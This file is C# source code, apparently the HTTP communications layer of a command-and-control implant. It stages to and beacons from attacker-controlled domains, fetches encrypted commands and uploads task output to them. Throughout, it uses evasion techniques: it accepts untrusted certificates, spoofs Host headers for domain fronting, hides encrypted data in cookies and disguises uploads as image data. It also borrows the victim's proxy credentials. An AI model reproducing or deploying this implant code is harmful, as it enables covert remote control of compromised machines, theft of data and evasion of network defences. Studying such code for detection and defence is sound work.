#if HTTP
using System;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;

internal class HttpComms : IComms
{
    private readonly Config _config;
    private readonly ImageDataObfuscator _imageDataObfuscator;

    internal HttpComms(Config config)
    {
        _config = config;
        _imageDataObfuscator = new ImageDataObfuscator(config);
        Utils.AllowUntrustedCertificates();
    }

    public string Stage(string environmentalInfo)
    {
        var retriesCount = 0;
        var waitTime = _config.StageWaitTimeMillis * 1000;
        do
        {
            try
            {
                foreach (var domain in _config.StageCommsChannels.Keys)
                {
                    var encryptedCookie = Encryption.Encrypt(_config.Key, environmentalInfo);
                    var hostHeader = _config.StageCommsChannels[domain];
                    var url = domain + _config.StageUrl;
                    var webClient = GetWebClient(encryptedCookie, hostHeader);
                    try
                    {
#if DEBUG
                        Program.STDOUT.WriteLine($"[*] Staging to: {url}");
#endif
                        var encryptedResponse = webClient.DownloadString(url);
                        var decrypted = Encoding.UTF8.GetString(Encryption.Decrypt(_config.Key, encryptedResponse)).TrimEnd('\0');
                        return Encoding.UTF8.GetString(Convert.FromBase64String(decrypted));
                    }
                    catch (Exception e)
                    {
#if DEBUG
                        Program.STDOUT.WriteLine($"[-] Error staging to {url} with host header: {hostHeader}: {e}");
#endif
                        Thread.Sleep(Program.RANDOM.Next(1, waitTime));
                    }
                }
            }
            catch
            {
                retriesCount++;
                Thread.Sleep(waitTime);
                waitTime *= 2;
            }
        } while (_config.RetriesEnabled && retriesCount < _config.RetryLimit);

#if DEBUG
        Program.STDOUT.WriteLine("[-] Exceeded retries count, quitting...");
#endif
        throw new Exception("0x0005");
    }

    public string GetCommands()
    {
        return Beacon();
    }

    public void SendTaskOutputString(string taskId, string data)
    {
        SendTaskOutputBytes(taskId, Encoding.UTF8.GetBytes(data));
    }

    public void SendTaskOutputBytes(string taskId, byte[] data)
    {
        if (taskId == null)
        {
            taskId = "No Task ID";
        }

        var encryptedTaskId = Encryption.Encrypt(_config.Key, taskId);
        var encryptedData = Encryption.Encrypt(_config.Key, data, true);
        var outputBytes = Convert.FromBase64String(encryptedData);
        var bytesToSend = _imageDataObfuscator.PadWithImageData(outputBytes);

        var attempts = 0;
        while (attempts < 5)
        {
            var randomIndex = Program.RANDOM.Next(_config.StageCommsChannels.Count);
            var domain = _config.StageCommsChannels.Keys.ToList()[randomIndex];
            var hostHeader = _config.StageCommsChannels.Values.ToList()[randomIndex];
            try
            {
                var url = GenerateUri(domain);
                var webClient = GetWebClient(encryptedTaskId, hostHeader);
                webClient.UploadData(url, bytesToSend);
                return;
            }
            catch (Exception e)
            {
                if (_config.StageCommsChannels.Count > 1)
                {
                    _config.StageCommsChannels.Remove(domain);
                }
#if DEBUG
                Program.STDOUT.WriteLine($"[-] Exception sending task output: {e}");
#endif
            }

            attempts++;
        }
    }

    private string Beacon()
    {
        var randomIndex = Program.RANDOM.Next(_config.BeaconCommsChannels.Count);
        var domain = _config.BeaconCommsChannels.Keys.ToList()[randomIndex];
        var hostHeader = _config.BeaconCommsChannels.Values.ToList()[randomIndex];
        var url = GenerateUri(domain);
        var webClient = GetWebClient(null, hostHeader);
#if DEBUG
        Program.STDOUT.WriteLine($"[*] Beaconing to {url}");
#endif
        var encryptedResponse = webClient.DownloadString(url);
        try
        {
            var decrypted = Encoding.UTF8.GetString(Encryption.Decrypt(_config.Key, encryptedResponse)).TrimEnd('\0');
            return Encoding.UTF8.GetString(Convert.FromBase64String(decrypted));
        }
        catch (Exception)
        {
            return "";
        }
    }

    private string GenerateUri(string domain)
    {
        var randomIndex = Program.RANDOM.Next(_config.URIs.Count);
        return $"{domain}/{_config.URIs[randomIndex]}{Guid.NewGuid()}/?{_config.ImplantId}";
    }

    private WebClient GetWebClient(string cookie, string hostHeader)
    {
        try
        {
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)192 | (SecurityProtocolType)768 | (SecurityProtocolType)3072;
        }
        catch (Exception e)
        {
#if DEBUG
            Program.STDOUT.WriteLine($"[-] Error setting security protocol: {e}");
#endif
        }

        var webClient = new WebClient();

        if (!string.IsNullOrEmpty(_config.ProxyUrl))
        {
            var proxy = new WebProxy
            {
                Address = new Uri(_config.ProxyUrl),
                Credentials = new NetworkCredential(_config.ProxyUser, _config.ProxyPassword)
            };
            if (string.IsNullOrEmpty(_config.ProxyUser))
            {
                proxy.UseDefaultCredentials = true;
            }

            proxy.BypassProxyOnLocal = false;
            webClient.Proxy = proxy;
        }
        else
        {
            if (null != webClient.Proxy)
                webClient.Proxy.Credentials = CredentialCache.DefaultCredentials;
        }

        if (!string.IsNullOrEmpty(hostHeader))
            webClient.Headers.Add("Host", hostHeader);

        webClient.Headers.Add("User-Agent", _config.UserAgent);
        webClient.Headers.Add("Referer", _config.HttpReferrer);

        if (null != cookie)
            webClient.Headers.Add(HttpRequestHeader.Cookie, $"SessionID={cookie}");

        return webClient;
    }


    public void Dispose()
    {
    }

    private class ImageDataObfuscator
    {
        private readonly Config _config;

        internal ImageDataObfuscator(Config config)
        {
            _config = config;
        }

        internal byte[] PadWithImageData(byte[] data)
        {
            const int maxBytesLen = 1500;
            var maxDataLength = data.Length + maxBytesLen;
            var randomImage = _config.Images[new Random().Next(0, _config.Images.Count)];
            var imgBytes = Convert.FromBase64String(randomImage);
            var bytePadding = Encoding.UTF8.GetBytes(RandomString(maxBytesLen - imgBytes.Length));
            var imageBytesFull = new byte[maxDataLength];

            Array.Copy(imgBytes, 0, imageBytesFull, 0, imgBytes.Length);
            Array.Copy(bytePadding, 0, imageBytesFull, imgBytes.Length, bytePadding.Length);
            Array.Copy(data, 0, imageBytesFull, imgBytes.Length + bytePadding.Length, data.Length);
            return imageBytesFull;
        }

        private static string RandomString(int length)
        {
            const string chars = "...................@..........................Tyscf";
            return new string(Enumerable.Repeat(chars, length).Select(s => s[Program.RANDOM.Next(s.Length)]).ToArray());
        }
    }
}
#endif